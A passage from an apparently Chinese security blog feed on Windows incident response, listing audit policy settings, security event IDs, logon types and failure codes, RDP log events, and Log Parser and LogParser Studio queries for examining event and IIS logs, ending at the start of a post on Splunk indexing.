align="center">策略更改</td></tr></tbody></table><table><thead><tr><th align="center"><strong>子类别</strong></th><th align="center"><strong>默认状态</strong></th><th align="center"><strong>事件ID</strong></th><th align="center"><strong>事件说明</strong></th></tr></thead><tbody><tr><td align="center">审核审核策略更改</td><td align="center">成功</td><td align="center">4715</td><td align="center">对象的审核策略 (SACL) 已更改.</td></tr><tr><td align="center"></td><td align="center">成功</td><td align="center"><mark class="tag-plugin colorful mark" color="red">4719</mark></td><td align="center"><mark class="tag-plugin colorful mark" color="red">系统审核策略已更改.</mark></td></tr><tr><td align="center"></td><td align="center">成功</td><td align="center">4817</td><td align="center">对象的审核设置已更改.</td></tr><tr><td align="center"></td><td align="center">成功</td><td align="center">4902</td><td align="center">创建了每用户审核策略表.</td></tr><tr><td align="center"></td><td align="center">成功</td><td align="center">4904</td><td align="center">已尝试注册安全事件源.</td></tr><tr><td align="center"></td><td align="center">成功</td><td align="center">4905</td><td align="center">已尝试取消注册安全事件源.</td></tr><tr><td align="center"></td><td align="center">成功</td><td align="center">4906</td><td align="center">CrashOnAuditFail 值已更改.</td></tr><tr><td align="center"></td><td align="center">成功</td><td align="center">4907</td><td align="center">对象的审核设置已更改.</td></tr><tr><td align="center"></td><td align="center">成功</td><td align="center">4908</td><td align="center">特殊组登录表已修改.</td></tr><tr><td align="center"></td><td align="center">成功</td><td align="center">4912</td><td align="center">每用户审核策略已更改.</td></tr><tr><td align="center">审核身份验证策略更改</td><td align="center">成功</td><td align="center">4713</td><td align="center">Kerberos 策略已更改.</td></tr><tr><td align="center"></td><td align="center">成功</td><td align="center">4716</td><td align="center">可信域信息已修改.</td></tr><tr><td align="center"></td><td align="center">成功</td><td align="center">4717</td><td align="center">系统安全访问被授予一个帐户.</td></tr><tr><td align="center"></td><td align="center">成功</td><td align="center">4718</td><td align="center">系统安全访问权限已从帐户中删除</td></tr><tr><td align="center"></td><td align="center">成功</td><td align="center">4739</td><td align="center">域策略已更改.</td></tr><tr><td align="center"></td><td align="center">成功</td><td align="center">4864</td><td align="center">检测到命名空间冲突.</td></tr><tr><td align="center"></td><td align="center">成功</td><td align="center">4865</td><td align="center">添加了受信任的林信息条目.</td></tr><tr><td align="center"></td><td align="center">成功</td><td align="center">4866</td><td align="center">删除了受信任的林信息条目.</td></tr><tr><td align="center"></td><td align="center">成功</td><td align="center">4867</td><td align="center">受信任的林信息条目已修改.</td></tr></tbody></table><h4 id="审核登录事件"><a href="#审核登录事件" class="headerlink" title="审核登录事件"></a>审核登录事件</h4><blockquote><p>此安全设置确定 OS 是否对尝试登录此计算机 或从中注销的用户的每个实例进行审核.</p></blockquote><table><thead><tr><th align="center"><strong>类别</strong></th><th align="center"><strong>子类别</strong></th><th align="center"><strong>默认状态</strong></th><th align="center">对应高级审核策略配置</th></tr></thead><tbody><tr><td align="center">审核登录事件</td><td align="center">审核账户锁定</td><td align="center">成功</td><td align="center">登录&#x2F;注销</td></tr><tr><td align="center"></td><td align="center">审核 IPsec 扩展模式</td><td align="center">无审核</td><td align="center">登录&#x2F;注销</td></tr><tr><td align="center"></td><td align="center">审核 IPsec 主模式</td><td align="center">无审核</td><td align="center">登录&#x2F;注销</td></tr><tr><td align="center"></td><td align="center">审核 IPsec 快速模式</td><td align="center">无审核</td><td align="center">登录&#x2F;注销</td></tr><tr><td align="center"></td><td align="center">审核注销</td><td align="center">成功</td><td align="center">登录&#x2F;注销</td></tr><tr><td align="center"></td><td align="center">审核登录</td><td align="center">客户端:成功<br />服务器:成功和失败</td><td align="center">登录&#x2F;注销</td></tr><tr><td align="center"></td><td align="center">审核网络策略服务器</td><td align="center">成功和失败</td><td align="center">登录&#x2F;注销</td></tr><tr><td align="center"></td><td align="center">审核其他登录&#x2F;注销事件</td><td align="center">无审核</td><td align="center">登录&#x2F;注销</td></tr><tr><td align="center"></td><td align="center">审核特别登录</td><td align="center">成功</td><td align="center">登录&#x2F;注销</td></tr></tbody></table><table><thead><tr><th align="center">子类别</th><th align="center">默认状态</th><th align="center">事件ID</th><th align="center">事件说明</th></tr></thead><tbody><tr><td align="center">审核账户锁定</td><td align="center">成功</td><td align="center"><mark class="tag-plugin colorful mark" color="red">4625</mark></td><td align="center"><mark class="tag-plugin colorful mark" color="red">帐户登录失败.</mark></td></tr><tr><td align="center">审核注销</td><td align="center">成功</td><td align="center">4634</td><td align="center">帐户已注销.</td></tr><tr><td align="center">审核注销</td><td align="center">成功</td><td align="center">4647</td><td align="center">用户发起的注销.</td></tr><tr><td align="center">审核登录</td><td align="center">客户端PC: 成功<br />服务器: 成功和失败</td><td align="center"><mark class="tag-plugin colorful mark" color="red">4624</mark></td><td align="center"><mark class="tag-plugin colorful mark" color="red">帐户登录成功.</mark></td></tr><tr><td align="center"></td><td align="center"></td><td align="center"><mark class="tag-plugin colorful mark" color="red">4625</mark></td><td align="center"><mark class="tag-plugin colorful mark" color="red">帐户登录失败.</mark></td></tr><tr><td align="center"></td><td align="center"></td><td align="center">4648</td><td align="center">尝试使用显式凭据登录.</td></tr><tr><td align="center"></td><td align="center"></td><td align="center">4675</td><td align="center">SID 被过滤.</td></tr><tr><td align="center">审核网络策略服务器</td><td align="center">成功和失败</td><td align="center"></td><td align="center">网络策略服务器授予用户访问权限.</td></tr><tr><td align="center"></td><td align="center"></td><td align="center">6273</td><td align="center">网络策略服务器拒绝访问用户.</td></tr><tr><td align="center"></td><td align="center"></td><td align="center">6274</td><td align="center">网络策略服务器放弃了对用户的请求.</td></tr><tr><td align="center"></td><td align="center"></td><td align="center">6275</td><td align="center">网络策略服务器丢弃了用户的计费请求.</td></tr><tr><td align="center"></td><td align="center"></td><td align="center">6276</td><td align="center">网络策略服务器隔离了一个用户.</td></tr><tr><td align="center"></td><td align="center"></td><td align="center">6277</td><td align="center">网络策略服务器授予用户访问权限,但由于主机不符合定义的健康策略而使其处于试用状态.</td></tr><tr><td align="center"></td><td align="center"></td><td align="center">6278</td><td align="center">网络策略服务器授予用户完全访问权限,因为主机符合定义的健康策略.</td></tr><tr><td align="center"></td><td align="center"></td><td align="center">6279</td><td align="center">由于多次失败的身份验证尝试,网络策略服务器锁定了用户帐户.</td></tr><tr><td align="center"></td><td align="center"></td><td align="center">6280</td><td align="center">网络策略服务器解锁了用户帐户.</td></tr><tr><td align="center"><mark class="tag-plugin colorful mark" color="red">审核特别登录</mark></td><td align="center">成功</td><td align="center">4964</td><td align="center">已将特殊组分配给新登录</td></tr></tbody></table><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407031839779.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407031839364.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407031843997.png" data-fancybox="true"/></div></div><table><thead><tr><th><strong>登录类型</strong></th><th><strong>描述</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td><mark class="tag-plugin colorful mark" color="red">2</mark></td><td><mark class="tag-plugin colorful mark" color="red">交互式登录(Interactive)</mark></td><td><mark class="tag-plugin colorful mark" color="red">用户在本地进行登录.</mark></td></tr><tr><td><mark class="tag-plugin colorful mark" color="red">3</mark></td><td><mark class="tag-plugin colorful mark" color="red">网络(Network)</mark></td><td><mark class="tag-plugin colorful mark" color="red">最常见的情况就是连接到共享文件夹或共享打印机时.</mark></td></tr><tr><td>4</td><td>批处理(Batch)</td><td>通常表明某计划任 务启动.</td></tr><tr><td>5</td><td>服务(Service)</td><td>每种服务都被配置 在某个特定的用户 账号下运行.</td></tr><tr><td>7</td><td>解锁(Unlock)</td><td>屏保解锁.</td></tr><tr><td>8</td><td>网络明文(NetworkCleartext)</td><td>登录的密码在网络 上是通过明文传输 的,如FTP.</td></tr><tr><td>9</td><td>新凭证(NewCredentials)</td><td>使用带&#x2F;Netonly参数 的RUNAS命令运行一 个程序.</td></tr><tr><td><mark class="tag-plugin colorful mark" color="red">10</mark></td><td><mark class="tag-plugin colorful mark" color="red">远程交互(RemoteInteractive)</mark></td><td><mark class="tag-plugin colorful mark" color="red">通过终端服务、远程桌面或远程协助访问计算机.</mark></td></tr><tr><td>11</td><td>缓存交互(CachedInteractive)</td><td>以一个域用户登录而又没有域控制器可用</td></tr></tbody></table><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407031839370.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407031839011.png" data-fancybox="true"/></div></div><table><thead><tr><th align="center">地位和子状态码</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center"><mark class="tag-plugin colorful mark" color="red">0xc0000064</mark></td><td align="center"><mark class="tag-plugin colorful mark" color="red">用户名不存在</mark></td></tr><tr><td align="center"><mark class="tag-plugin colorful mark" color="red">0xc000006a</mark></td><td align="center"><mark class="tag-plugin colorful mark" color="red">用户名是正确的,但密码是错误的</mark></td></tr><tr><td align="center">0xc0000234</td><td align="center">用户当前锁定</td></tr><tr><td align="center">0xc0000072</td><td align="center">帐户目前禁用</td></tr><tr><td align="center">0xc000006f</td><td align="center">用户试图登录天的外周或时间限制</td></tr><tr><td align="center">0xc0000070</td><td align="center">工作站的限制</td></tr><tr><td align="center">0xc0000193</td><td align="center">帐号过期</td></tr><tr><td align="center">0xc0000071</td><td align="center">过期的密码</td></tr><tr><td align="center">0xc0000133</td><td align="center">时钟之间的直流和其他电脑太不同步</td></tr><tr><td align="center">0xc0000224</td><td align="center">在下次登录用户需要更改密码</td></tr><tr><td align="center">0xc0000225</td><td align="center">显然一个缺陷在Windows和不是一个风险</td></tr><tr><td align="center">0xc000015b</td><td align="center">没有被授予该用户请求登录类型(又名登录 正确的)在这台机器</td></tr><tr><td align="center">0xc000006d</td><td align="center">似乎是由于系统问题和不安全</td></tr></tbody></table><h4 id="审核账户管理"><a href="#审核账户管理" class="headerlink" title="审核账户管理"></a>审核账户管理</h4><blockquote><p>此安全设置确定是否审核计算机上的每个帐户管理事件.帐户管理事件示例包括:</p><ul><li>创建、更改或删除用户帐户或组.</li><li>重命名、禁用或启用用户帐户.</li><li>设置或更改密码.</li></ul></blockquote><table><thead><tr><th align="center">类别</th><th align="center">子类别</th><th align="center">默认状态</th><th align="center">对应本地审核策略</th></tr></thead><tbody><tr><td align="center">帐户管理</td><td align="center">审核应用组程序管理</td><td align="center">无审核</td><td align="center">审核账户管理</td></tr><tr><td align="center"></td><td align="center">审核计算机帐户管理</td><td align="center">无审核</td><td align="center"></td></tr><tr><td align="center"></td><td align="center">审核通讯组管理</td><td align="center">无审核</td><td align="center"></td></tr><tr><td align="center"></td><td align="center">审核其他账户管理事件</td><td align="center">无审核</td><td align="center"></td></tr><tr><td align="center"></td><td align="center">审核安全组管理</td><td align="center">成功</td><td align="center"></td></tr><tr><td align="center"></td><td align="center">审核用户账户管理</td><td align="center">成功</td><td align="center"></td></tr></tbody></table><table><thead><tr><th align="center"><strong>子类别</strong></th><th align="center"><strong>默认状态</strong></th><th align="center"><strong>事件ID</strong></th><th align="center"><strong>事件</strong></th></tr></thead><tbody><tr><td align="center">审核安全组管理</td><td align="center">成功</td><td align="center">4727</td><td align="center">已创建启用安全性的全局组.</td></tr><tr><td align="center"></td><td align="center"></td><td align="center"><mark class="tag-plugin colorful mark" color="red">4728</mark></td><td align="center"><mark class="tag-plugin colorful mark" color="red">一个成员被添加到启用安全的全局组中.</mark></td></tr><tr><td align="center"></td><td align="center"></td><td align="center"><mark class="tag-plugin colorful mark" color="red">4729</mark></td><td align="center"><mark class="tag-plugin colorful mark" color="red">成员已从启用安全的全局组中删除.</mark></td></tr><tr><td align="center"></td><td align="center"></td><td align="center">4730</td><td align="center">已删除启用安全的全局组.</td></tr><tr><td align="center"></td><td align="center"></td><td align="center">4731</td><td align="center">已创建启用安全性的本地组.</td></tr><tr><td align="center"></td><td align="center"></td><td align="center"><mark class="tag-plugin colorful mark" color="red">4732</mark></td><td align="center"><mark class="tag-plugin colorful mark" color="red">一个成员被添加到启用安全的本地组.</mark></td></tr><tr><td align="center"></td><td align="center"></td><td align="center"><mark class="tag-plugin colorful mark" color="red">4733</mark></td><td align="center"><mark class="tag-plugin colorful mark" color="red">成员已从启用安全的本地组中删除.</mark></td></tr><tr><td align="center"></td><td align="center"></td><td align="center">4734</td><td align="center">已删除启用安全的本地组.</td></tr><tr><td align="center"></td><td align="center"></td><td align="center">4735</td><td align="center">已更改启用安全的本地组.</td></tr><tr><td align="center"></td><td align="center"></td><td align="center">4737</td><td align="center">已更改启用安全的全局组.</td></tr><tr><td align="center"></td><td align="center"></td><td align="center">4754</td><td align="center">已创建启用安全的通用组.</td></tr><tr><td align="center"></td><td align="center"></td><td align="center">4755</td><td align="center">已更改启用安全的通用组.</td></tr><tr><td align="center"></td><td align="center"></td><td align="center"><mark class="tag-plugin colorful mark" color="red">4756</mark></td><td align="center"><mark class="tag-plugin colorful mark" color="red">一个成员被添加到启用安全的通用组.</mark></td></tr><tr><td align="center"></td><td align="center"></td><td align="center"><mark class="tag-plugin colorful mark" color="red">4757</mark></td><td align="center"><mark class="tag-plugin colorful mark" color="red">成员已从启用安全的通用组中删除.</mark></td></tr><tr><td align="center"></td><td align="center"></td><td align="center">4758</td><td align="center">已删除启用安全的通用组.</td></tr><tr><td align="center"></td><td align="center"></td><td align="center">4764</td><td align="center">组的类型已更改.</td></tr><tr><td align="center">审核用户账户管理</td><td align="center">成功</td><td align="center"><mark class="tag-plugin colorful mark" color="red">4720</mark></td><td align="center"><mark class="tag-plugin colorful mark" color="red">已创建用户帐户.</mark></td></tr><tr><td align="center"></td><td align="center"></td><td align="center"><mark class="tag-plugin colorful mark" color="red">4722</mark></td><td align="center"><mark class="tag-plugin colorful mark" color="red">已启用用户帐户.</mark></td></tr><tr><td align="center"></td><td align="center"></td><td align="center">4723</td><td align="center">试图更改帐户的密码.</td></tr><tr><td align="center"></td><td align="center"></td><td align="center"><mark class="tag-plugin colorful mark" color="red">4724</mark></td><td align="center"><mark class="tag-plugin colorful mark" color="red">已尝试重置帐户密码.</mark></td></tr><tr><td align="center"></td><td align="center"></td><td align="center">4725</td><td align="center">用户帐户被禁用.</td></tr><tr><td align="center"></td><td align="center"></td><td align="center"><mark class="tag-plugin colorful mark" color="red">4726</mark></td><td align="center"><mark class="tag-plugin colorful mark" color="red">用户帐户被删除.</mark></td></tr><tr><td align="center"></td><td align="center"></td><td align="center">4738</td><td align="center">用户帐户已更改.</td></tr><tr><td align="center"></td><td align="center"></td><td align="center">4740</td><td align="center">用户帐户被锁定.</td></tr><tr><td align="center"></td><td align="center"></td><td align="center">4765</td><td align="center">SID 历史记录已添加到帐户</td></tr><tr><td align="center"></td><td align="center"></td><td align="center">4766</td><td align="center">尝试向帐户添加 SID 历史记录失败.</td></tr><tr><td align="center"></td><td align="center"></td><td align="center">4767</td><td align="center">用户帐户已解锁.</td></tr><tr><td align="center"></td><td align="center"></td><td align="center">4780</td><td align="center">ACL 是在作为管理员组成员的帐户上设置的.</td></tr><tr><td align="center"></td><td align="center"></td><td align="center">4781</td><td align="center">帐户名称已更改：</td></tr><tr><td align="center"></td><td align="center"></td><td align="center">4794</td><td align="center">已尝试设置目录服务还原模式.</td></tr><tr><td align="center"></td><td align="center"></td><td align="center">5376</td><td align="center">凭据管理器凭据已备份.</td></tr><tr><td align="center"></td><td align="center"></td><td align="center">5377</td><td align="center">凭据管理器凭据是从备份中恢复的.</td></tr></tbody></table><h5 id="远程登录事件"><a href="#远程登录事件" class="headerlink" title="远程登录事件"></a>远程登录事件</h5><p>当通过远程桌面协议（RDP）进行远程登录时，会在源主机和目的主机上生成一系列事件。以下是与RDP远程登录相关的重要事件ID及其含义，这些事件可以在Windows安全日志和远程连接日志中找到。</p><h6 id="安全日志（Security-evtx）"><a href="#安全日志（Security-evtx）" class="headerlink" title="安全日志（Security.evtx）"></a>安全日志（Security.evtx）</h6><table><thead><tr><th>事件ID</th><th>描述</th><th>重点说明</th></tr></thead><tbody><tr><td>4624</td><td>账户成功登录</td><td>表明有账户成功通过RDP登录</td></tr><tr><td>4648</td><td>使用明文凭证尝试登录</td><td>可能表明凭证被窃取或滥用</td></tr><tr><td>4778</td><td>重新连接到一台Windows主机的会话</td><td>表明会话被重新连接</td></tr><tr><td>4779</td><td>断开到一台Windows主机的会话</td><td>表明会话被断开</td></tr></tbody></table><h6 id="远程连接日志"><a href="#远程连接日志" class="headerlink" title="远程连接日志"></a>远程连接日志</h6><p><code>应用程序和服务日志</code>-&gt;<code>Microsoft</code>-&gt;<code>Windows</code>-&gt;<code>TerminalServices</code>-&gt;<code>RemoteConnectionManager</code>-&gt;<code>Operational</code></p><table><thead><tr><th>事件ID</th><th>描述</th><th>重点说明</th></tr></thead><tbody><tr><td>1149</td><td>用户认证成功</td><td>表明用户通过RDP认证成功</td></tr><tr><td>21</td><td>远程桌面服务：会话登录成功</td><td>表明RDP会话登录成功</td></tr><tr><td>24</td><td>远程桌面服务：会话已断开连接</td><td>表明RDP会话被断开</td></tr><tr><td>25</td><td>远程桌面服务：会话重新连接成功</td><td>表明RDP会话被重新连接</td></tr></tbody></table><h6 id="登录类型"><a href="#登录类型" class="headerlink" title="登录类型"></a>登录类型</h6><table><thead><tr><th>登录类型</th><th>描述</th><th>重点说明</th></tr></thead><tbody><tr><td>10</td><td>RemoteInteractive</td><td>专用于RDP登录</td></tr><tr><td>12</td><td>CachedRemoteInteractive</td><td>表明使用了缓存的RDP登录信息</td></tr></tbody></table><h3 id="Log-Parser"><a href="#Log-Parser" class="headerlink" title="Log Parser"></a>Log Parser</h3><ol><li><code>-i</code> 参数表示输入格式，可以接受以下值：<ul><li><code>EVT</code>: 表示输入格式为 Windows Event Log 格式 (.evt 或 .evtx 文件)。</li><li><code>CSV</code>: 表示输入格式为逗号分隔值 (CSV) 文件。</li><li><code>IISW3C</code>: 表示输入格式为 IIS (Internet Information Services) W3C 扩展日志文件格式。</li><li><code>TSV</code>: 表示输入格式为制表符分隔值 (TSV) 文件。</li><li><code>TEXTLINE</code>: 表示输入格式为文本文件，每行作为一个数据行。</li><li><code>TEXTWORD</code>: 表示输入格式为文本文件，每个单词作为一个数据行。</li></ul></li><li><code>-o</code> 参数表示输出格式，可以接受以下值：<ul><li><code>DATAGRID</code>: 表示输出结果以数据网格形式显示，适合交互式探索和查看。</li><li><code>CSV</code>: 表示输出结果为逗号分隔值 (CSV) 格式，适合导出和后续处理。</li><li><code>TSV</code>: 表示输出结果为制表符分隔值 (TSV) 格式。</li><li><code>XML</code>: 表示输出结果为 XML 格式。</li><li><code>SQL</code>: 表示输出结果为 SQL 数据库表格格式。</li></ul></li></ol><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 图形化</span></span><br><span class="line"><span class="comment"># 默认安装到C:\Program Files (x86)\Log Parser 2.2</span></span><br><span class="line"><span class="comment"># 将日志拷贝出来在进行操作</span></span><br><span class="line">LogParser.exe <span class="literal">-i</span>:EVT <span class="literal">-o</span>:DATAGRID <span class="string">&quot;SELECT * FROM C:\Users\Administrator\Desktop\Security.evtx&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 分析IIS日志</span></span><br><span class="line">LogParser.exe <span class="string">&quot;select time, c-ip,cs-uri-stem,cs-uri-query, sc-status, time-taken from C:\Users\Administrator\Desktop\ex170818.log where cs-uri-query like &#x27;%and%&#x27; &quot;</span> <span class="literal">-o</span>:datagrid</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用SQL语句统计实现我们需要的数据。</span></span><br><span class="line"></span><br><span class="line">LogParser.exe <span class="literal">-i</span>:IISW3C <span class="literal">-o</span>:DATAGRID <span class="string">&quot;SELECT c-ip,COUNT(c-ip) FROM C:\Users\Administrator\Desktop\ex170818.log GROUP BY c-ip ORDER BY COUNT(c-iP) DESC&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将结果数据导出到csv中</span></span><br><span class="line"></span><br><span class="line">LogParser.exe <span class="literal">-i</span>:IISW3C <span class="literal">-o</span>:csv <span class="string">&quot;SELECT c-ip,COUNT(c-ip) into 1.csv FROM C:\Users\Administrator\Desktop\ex170818.log GROUP BY c-ip ORDER BY COUNT(c-iP) DESC&quot;</span></span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407041358118.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407041545856.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407041549792.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407041550907.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407041954224.png" data-fancybox="true"/></div></div><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在入侵事件中，我们经常会需要查找&quot;post&quot;请求，判断是否有上传木马文件等行为，或者访问页面中包含&quot;user&quot;、&quot;manager&quot;、&quot;admin&quot;等类似管理员的字段判断是否访问了后台管理页面。</span></span><br><span class="line">LogParser.exe <span class="literal">-i</span>:IISW3C <span class="literal">-o</span>:DATAGRID <span class="string">&quot;SELECT * FROM C:\Users\Administrator\Desktop\ex170818.log WHERE cs-method=&#x27;POST&#x27;&quot;</span></span><br><span class="line">LogParser.exe <span class="literal">-i</span>:IISW3C <span class="literal">-o</span>:DATAGRID <span class="string">&quot;SELECT * FROM C:\Users\Administrator\Desktop\ex170818.log WHERE cs-uri-stem LIKE &#x27;%admin%&#x27;&quot;</span></span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407041848192.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407041848864.png" data-fancybox="true"/></div></div><h3 id="LogParser-Studio"><a href="#LogParser-Studio" class="headerlink" title="LogParser Studio"></a>LogParser Studio</h3><a class="tag-plugin colorful button" color="theme" title="官网" href="https://techcommunity.microsoft.com/t5/exchange-team-blog/introducing-log-parser-studio/ba-p/601131"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg><span>官网</span></a><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211101913649.png" data-fancybox="true"/></div></div><ol><li>打开需要分析的日志文件<div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211101918738.png" data-fancybox="true"/></div></div></li><li>选中需要分析的日志文件，接着新建一个查询<div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211101933198.png" data-fancybox="true"/></div></div></li><li>我们还是以刚才统计出访问次数最多的IP地址及次数为例子<br><code>SELECT top 10 c-ip,count(c-ip) FROM &#39;[LOGFILEPATH]&#39; GROUP BY c-ip ORDER BY COUNT(c-iP) DESC</code></li><li>然后点击我们的执行按钮，即可输出结果<div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211101934908.png" data-fancybox="true"/></div></div>这里注意<code>LogParser Studio</code>与<code>LogParser</code>有几个区别：</li><li>输入文件类型：<code>LogParser Studio</code>已经预先选择输入文件类型，查询语句不需要再定义</li><li>输出文件类型：<code>LogParser Studio</code>默认使用窗口展示数据，如需指定其他输出文件类型或者导出文件，需要在语句中定义</li><li>也可将我们自定义的SQL语句，保存加入到库中，方便下次使用</li><li>也可点击相应的按钮将查询统计的数据导出。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="应急响应" scheme="https://jiangjiyue.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    <category term="Windows" scheme="https://jiangjiyue.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>应急响应之Splunk</title>
    <link href="https://jiangjiyue.github.io/2024/07/07/4677b70c/"/>
    <id>https://jiangjiyue.github.io/2024/07/07/4677b70c/</id>
    <published>2024-07-07T02:34:49.000Z</published>
    <updated>2024-07-27T11:36:58.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><div class="tag-plugin grid" bg="card" style="grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));"><div class="cell" style="">    <p>总字符数: 33.62K </p>    </div>    <div class="cell" style="">    <p>代码: 18.08K, 文本: 7.33K</p>    </div>    <div class="cell" style="">    <p>预计阅读时间: 1.84 小时</p>    </div>    </div><h2 id="Splunk索引数据类型"><a href="#Splunk索引数据类型" class="headerlink" title="Splunk索引数据类型"></a>Splunk索引数据类型</h2><blockquote><p>在计算机科学和数据库领域,索引(Index)是一种数据结构,用于提高数据库表中数据的检索速度.索引可以看作是一本书的目录,它允许用户快速找到所需的信息,而不必扫描整个数据集.</p><p><strong>索引的主要特点和作用:</strong></p><ol><li><strong>提高查询速度</strong>:索引通过创建一个指向数据行的指针列表,使得数据库引擎能够快速定位到特定的数据行,从而大大加快查询操作的速度.</li><li><strong>减少磁盘I&#x2F;O</strong>:索引可以减少数据库系统需要读取的磁盘页数,因为索引通常存储在内存中,或者存储在磁盘上更紧凑的区域,从而减少了磁盘I&#x2F;O操作.</li><li><strong>唯一性约束</strong>:索引可以强制列的唯一性,确保表中的数据没有重复值.例如,主键索引就是一种唯一索引.</li><li><strong>排序</strong>:索引可以自动对数据进行排序,这对于需要排序的查询非常有用.</li><li><strong>加速连接操作</strong>:在多表连接查询中,索引可以显著提高连接操作的性能.</li></ol><p><strong>索引的类型:</strong></p><ol><li><strong>B-Tree索引</strong>:最常见的索引类型,适用于范围查询和排序操作.</li><li><strong>哈希索引</strong>:适用于等值查询,但不支持范围查询.</li><li><strong>全文索引</strong>:用于文本搜索,支持复杂的文本匹配查询.</li><li><strong>空间索引</strong>:用于地理空间数据,支持空间操作.</li></ol></blockquote><p>Splunk平台可以索引任何类型的数据.特别是Splunk平台可以索引任何和所有IT流、机器和历史数据,如Microsoft Windows事件日志、Web服务器日志、实时应用程序日志、网络流量、指标、更改监控、消息队列、存档文件等.</p><p>由于Splunk Enterprise是本机部署的,因此可以直接将数据导入实例,也可以使用通用或重型转发器来导入数据.一般来说,可以将Splunk Enterprise输入分类如下:</p><ul><li>Files and directories —&gt; 文件和目录</li><li>Network events —&gt; 网络事件</li><li>Windows data —&gt; Windows数据</li><li>Other sources —&gt; 其他来源</li></ul><h3 id="文件和目录"><a href="#文件和目录" class="headerlink" title="文件和目录"></a>文件和目录</h3><p>使用文件和目录监视器输入处理器从文件和目录中获取数据.要监视文件和目录,请参阅<a href="http://docs.splunk.com/Documentation/Splunk/9.2.2/Data/MonitorFilesAndDirectories">从文件和目录获取数据.</a></p><h3 id="网络事件"><a href="#网络事件" class="headerlink" title="网络事件"></a>网络事件</h3><p>索引来自任何网络端口的数据,例如来自sysystem-ng或通过TCP协议传输的任何其他应用程序的远程数据.它还可以索引UDP数据,但尽可能使用TCP以增强可靠性.</p><p>Splunk Enterprise还可以接收和索引远程设备发出的SNMP事件和警报.</p><ul><li><p>要从网络端口获取数据,请参阅<a 